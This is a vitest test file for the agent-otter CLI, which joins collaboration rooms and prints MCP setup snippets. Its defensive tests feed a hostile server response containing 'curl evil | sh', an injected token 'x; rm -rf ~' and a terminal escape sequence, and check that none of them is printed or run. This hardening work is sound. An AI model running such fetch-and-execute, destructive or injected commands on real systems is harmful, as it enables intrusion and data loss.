import { buildSnippets, type JoinResponse } from '@agent-otter/protocol';
import { describe, expect, it } from 'vitest';
import { parseInviteLink } from '../src/core.js';
import { run, type Io } from '../src/main.js';

const ROOM = 'a'.repeat(12);
const SEC = 'b'.repeat(32);
const TOKEN = 'T'.repeat(40);
const link = (origin = 'https://otter.example', frag = `${ROOM}.${SEC}`) => `${origin}/join#${frag}`;

const joinResponse = (): JoinResponse => {
  const { snippets, note } = buildSnippets('https://otter.example', TOKEN);
  return { participantId: 'p1', token: TOKEN, displayName: 'x', vendor: 'claude-code', cursorStartsAt: 0, snippets, note } as JoinResponse;
};

function harness(o: { status?: number; body?: unknown; platform?: string } = {}) {
  const out: string[] = [], err: string[] = [], spawned: { cmd: string; args: string[] }[] = [], fetched: { url: string; body: any }[] = [];
  const io: Io = {
    fetch: (async (url: string, init: RequestInit) => {
      fetched.push({ url, body: JSON.parse(init.body as string) });
      return new Response(JSON.stringify(o.body ?? joinResponse()), { status: o.status ?? 200 });
    }) as unknown as typeof fetch,
    spawn: async (cmd, args) => { spawned.push({ cmd, args }); return 0; },
    out: (s) => out.push(s), err: (s) => err.push(s), platform: o.platform ?? 'linux', user: 'alice',
  };
  return { io, out, err, spawned, fetched };
}

describe('parseInviteLink', () => {
  it('parses a valid link', () => expect(parseInviteLink(link())).toEqual({ origin: 'https://otter.example', roomId: ROOM, secret: SEC }));
  it('rejects a bad room id', () => expect(() => parseInviteLink(link(undefined, `zz.${SEC}`))).toThrow('room id'));
  it('rejects a bad secret without echoing it', () => expect(() => parseInviteLink(link(undefined, `${ROOM}.nothex`))).toThrow(/invalid invite secret$/));
  it('rejects a missing fragment', () => expect(() => parseInviteLink('https://otter.example/join')).toThrow('fragment'));
  it('refuses http to a remote host', () => expect(() => parseInviteLink(link('http://otter.example'))).toThrow('non-https'));
  it.each(['http://127.0.0.1:3000', 'http://localhost:3000'])('allows %s', (o) => expect(parseInviteLink(link(o)).origin).toBe(o));
});

describe('connect', () => {
  it('joins and prints only the claude snippet and note, never the fallback URL', async () => {
    const h = harness();
    expect(await run(['connect', link(), '--host', 'claude'], h.io)).toBe(0);
    expect(h.fetched[0]).toEqual({ url: `https://otter.example/rooms/${ROOM}/join`, body: { inviteSecret: SEC, displayName: 'alice-claude', vendor: 'claude-code' } });
    const text = h.out.join('');
    expect(text).toContain(`export AGENT_OTTER_TOKEN=${TOKEN}`);
    expect(text).toContain('claude mcp add');
    expect(text).not.toContain('/mcp/' + TOKEN);
    expect(text).not.toContain('mcp_servers');
    expect(h.spawned).toEqual([]);
  });
  it('prints the PowerShell variant on win32', async () => {
    const h = harness({ platform: 'win32' });
    await run(['connect', link(), '--host', 'claude'], h.io);
    expect(h.out.join('')).toContain('$env:AGENT_OTTER_TOKEN');
  });
  it('prints the codex toml and env line', async () => {
    const h = harness();
    await run(['connect', link(), '--host', 'codex', '--name', 'bob'], h.io);
    expect(h.fetched[0]!.body).toMatchObject({ displayName: 'bob', vendor: 'codex' });
    expect(h.out.join('')).toContain('[mcp_servers.agent-otter]');
    expect(h.out.join('')).toContain(`export AGENT_OTTER_TOKEN=${TOKEN}`);
  });
  it('--run executes the exact argv without a shell and without the token', async () => {
    const h = harness();
    expect(await run(['connect', link(), '--host', 'claude', '--run'], h.io)).toBe(0);
    expect(h.spawned).toEqual([{ cmd: 'claude', args: ['mcp', 'add', '--transport', 'http', 'agent-otter', 'https://otter.example/mcp', '--header', 'Authorization: Bearer ${AGENT_OTTER_TOKEN}'] }]);
    expect(JSON.stringify(h.spawned)).not.toContain(TOKEN);
    expect(h.out.join('')).toContain(`export AGENT_OTTER_TOKEN=${TOKEN}`);
    expect(h.out.join('')).not.toContain('--transport');
  });
  it('rejects --run for codex before any request', async () => {
    const h = harness();
    expect(await run(['connect', link(), '--host', 'codex', '--run'], h.io)).toBe(1);
    expect(h.err.join('')).toContain('by hand');
    expect(h.fetched).toEqual([]);
  });
  it('shows the server error and never the invite secret', async () => {
    const h = harness({ status: 403, body: { error: 'room closed', code: 'room_closed' } });
    expect(await run(['connect', link(), '--host', 'claude'], h.io)).toBe(1);
    expect(h.err.join('')).toContain('room closed');
    expect(h.err.join('')).not.toContain(SEC);
  });
});

describe('join request hardening', () => {
  it('refuses redirects with a clean message', async () => {
    const h = harness();
    let init: any;
    h.io.fetch = (async (_u: string, i: RequestInit) => { init = i; throw Object.assign(new TypeError('fetch failed'), { cause: new Error('unexpected redirect') }); }) as unknown as typeof fetch;
    expect(await run(['connect', link(), '--host', 'claude'], h.io)).toBe(1);
    expect(init.redirect).toBe('error');
    expect(init.signal).toBeInstanceOf(AbortSignal);
    expect(h.err.join('')).toContain('redirect');
    expect(h.err.join('')).not.toContain(SEC);
  });
  it('maps timeouts and network errors to generic messages', async () => {
    const h = harness();
    h.io.fetch = (async () => { throw new DOMException('x', 'TimeoutError'); }) as unknown as typeof fetch;
    await run(['connect', link(), '--host', 'claude'], h.io);
    expect(h.err.join('')).toContain('join timed out');
    h.err.length = 0;
    h.io.fetch = (async () => { throw new Error(`boom https://otter.example/rooms/${ROOM}/join ${SEC}`); }) as unknown as typeof fetch;
    await run(['connect', link(), '--host', 'claude'], h.io);
    expect(h.err.join('')).toBe('agent-otter: could not reach server\n');
  });
  it('redacts an invite secret echoed by the server', async () => {
    const h = harness({ status: 400, body: { error: `bad secret ${SEC}` } });
    await run(['connect', link(), '--host', 'claude'], h.io);
    expect(h.err.join('')).toContain('[redacted]');
    expect(h.err.join('')).not.toContain(SEC);
  });
  it('never prints the path fallback URL even if present', async () => {
    const h = harness();
    await run(['connect', link(), '--host', 'codex'], h.io);
    expect(h.out.join('')).not.toContain(joinResponse().snippets.pathFallbackUrl!);
  });
});

describe('untrusted join response', () => {
  const hostile = { ...joinResponse(), snippets: { ...joinResponse().snippets, claudeCode: 'curl evil | sh', codexConfigToml: 'evil-toml' }, note: '\x1b]0;pwned\x07' };
  it('rejects a hostile token and prints none of the server text', async () => {
    const h = harness({ body: { ...hostile, token: 'x; rm -rf ~' } });
    expect(await run(['connect', link(), '--host', 'claude'], h.io)).toBe(1);
    const all = h.out.join('') + h.err.join('');
    for (const bad of ['rm -rf', 'curl evil', 'pwned', '\x1b']) expect(all).not.toContain(bad);
    expect(h.err.join('')).toContain('invalid token');
  });
  it('prints only locally built snippets for a valid token', async () => {
    const h = harness({ body: hostile });
    expect(await run(['connect', link(), '--host', 'claude'], h.io)).toBe(0);
    const all = h.out.join('');
    for (const bad of ['curl evil', 'pwned', '\x1b']) expect(all).not.toContain(bad);
    expect(all).toContain(`export AGENT_OTTER_TOKEN=${TOKEN}`);
  });
  it('strips control characters from server errors', async () => {
    const h = harness({ status: 400, body: { error: 'bad\x1b]0;x\x07' + 'y'.repeat(300) } });
    await run(['connect', link(), '--host', 'claude'], h.io);
    expect(h.err.join('')).not.toContain('\x1b');
    expect(h.err.join('').length).toBeLessThan(300);
  });
});

describe('disconnect and usage', () => {
  it('prints or runs claude mcp remove', async () => {
    const h = harness();
    await run(['disconnect', '--host', 'claude'], h.io);
    expect(h.out.join('')).toContain('claude mcp remove agent-otter');
    await run(['disconnect', '--host', 'claude', '--run'], h.io);
    expect(h.spawned).toEqual([{ cmd: 'claude', args: ['mcp', 'remove', 'agent-otter'] }]);
  });
  it('explains codex removal', async () => {
    const h = harness();
    await run(['disconnect', '--host', 'codex'], h.io);
    expect(h.out.join('')).toContain('[mcp_servers.agent-otter]');
  });
  it('help exits 0, unknown command exits 1', async () => {
    const h = harness();
    expect(await run([], h.io)).toBe(0);
    expect(await run(['--help'], h.io)).toBe(0);
    expect(await run(['nope'], h.io)).toBe(1);
  });
});
